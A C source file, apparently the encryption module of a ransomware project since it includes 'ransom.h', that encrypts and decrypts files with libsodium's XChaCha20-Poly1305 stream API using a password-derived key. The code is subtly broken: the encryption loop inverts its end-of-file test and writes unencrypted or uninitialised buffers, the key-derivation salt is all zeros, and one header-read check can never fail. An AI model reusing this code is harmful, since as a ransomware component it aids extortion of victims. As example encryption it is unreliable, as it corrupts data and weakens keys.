#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>

static int generate_crypto_key(unsigned char *generated_key,
    const char *password)
{
    int ret = sodium_init();
    unsigned char salt[SALT_LEN];

    if (ret < 0) {
        perror("sodium_init");
        return ret;
    } else if (ret == 1)
        puts("libsodium already initialized.");
    sodium_memzero(salt, sizeof(salt));
    if ((ret = crypto_pwhash(generated_key, MAX_KEY_LEN, password, strlen(password),
            salt, crypto_pwhash_OPSLIMIT_INTERACTIVE, crypto_pwhash_MEMLIMIT_INTERACTIVE,
            crypto_pwhash_ALG_DEFAULT)))
        perror("crypto_pwh_ash");
    return ret;
}


static int graceful_exit(FILE *f1, FILE *f2, unsigned char *generated_key, int ret)
{
    fclose(f1);
    fclose(f2);
    sodium_memzero(generated_key, MAX_KEY_LEN);
    return ret;
}

static int core_encryption(unsigned char *generated_key,
    const char *filepath, const char *optfilepath)
{
    unsigned char out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char in[CHUNK_SIZE];
    crypto_secretstream_xchacha20poly1305_state st;
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    unsigned long long opt_len = 0;
    size_t read_len = 0;
    int eof = 0;
    unsigned char tag = 0;
    FILE *to_encrypt, *encrypted = NULL;

    if (!(to_encrypt = fopen(filepath, "rb"))
            || !(encrypted = fopen(optfilepath, "wb"))) {
        perror("fopen");
        return EXIT_FAILURE;
    }
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, generated_key);
    if (!fwrite(header, 1, sizeof(header), encrypted)) {
        perror("fwrite");
        return graceful_exit(to_encrypt, encrypted, generated_key, EXIT_FAILURE);
    }
    do {
        read_len = fread(in, 1, sizeof(in), to_encrypt);
        if ((eof = feof(to_encrypt)))
            tag = crypto_secretstream_xchacha20poly1305_push(
                &st, out, &opt_len, in, read_len, NULL, 0, tag);
        else tag = crypto_secretstream_xchacha20poly1305_TAG_FINAL;
        fwrite(out, 1, (size_t) opt_len, encrypted);
    } while (!eof);
    return graceful_exit(to_encrypt, encrypted, generated_key, EXIT_SUCCESS);
}

static int core_decryption(unsigned char *generated_key,
    const char *filepath, const char *optfilepath)
{
    unsigned char in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char out[CHUNK_SIZE];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *decrypted, *to_decrypt = NULL;
    unsigned long long opt_len = 0;
    size_t read_len = 0;
    int eof = 0;
    unsigned char tag = 0;

    if (!(to_decrypt = fopen(filepath, "rb"))
            || !(decrypted = fopen(optfilepath, "wb"))) {
        perror("fopen");
        return EXIT_FAILURE;
    }
    if (fread(header, 1, sizeof(header), to_decrypt) == (size_t) -1
        || crypto_secretstream_xchacha20poly1305_init_pull(
            &st, header, generated_key)) {
        perror("Incorrect header.");
        return graceful_exit(to_decrypt, decrypted, generated_key, EXIT_FAILURE);
    }
    do {
        read_len = fread(in, 1, sizeof(in), to_decrypt);
        eof = feof(to_decrypt);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, out, &opt_len, &tag,
            in, read_len, NULL, 0)) {
            perror("Corrupted chunk encountered.");
            return graceful_exit(to_decrypt, decrypted, generated_key, EXIT_FAILURE);
        }
        else if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            perror("premature end.");
            return graceful_exit(to_decrypt, decrypted, generated_key, EXIT_FAILURE);
        }
        else fwrite(out, 1, (size_t) opt_len, decrypted);

    } while (!eof);
    return graceful_exit(to_decrypt, decrypted, generated_key, EXIT_SUCCESS);
}

int encrypt_file(const char filepath[MAX_FILEPATH],
    const char optfilepath[MAX_FILEPATH], const char *password)
{
    unsigned char generated_key[MAX_KEY_LEN];

    if (generate_crypto_key(generated_key, password))
        return EXIT_FAILURE;
    return core_encryption(generated_key, filepath, optfilepath);
}

int decrypt_file(const char filepath[MAX_FILEPATH],
    const char optfilepath[MAX_FILEPATH], const char *password)
{
    unsigned char generated_key[MAX_KEY_LEN];

    if (generate_crypto_key(generated_key, password))
        return EXIT_FAILURE;
    return core_decryption(generated_key, filepath, optfilepath);
}
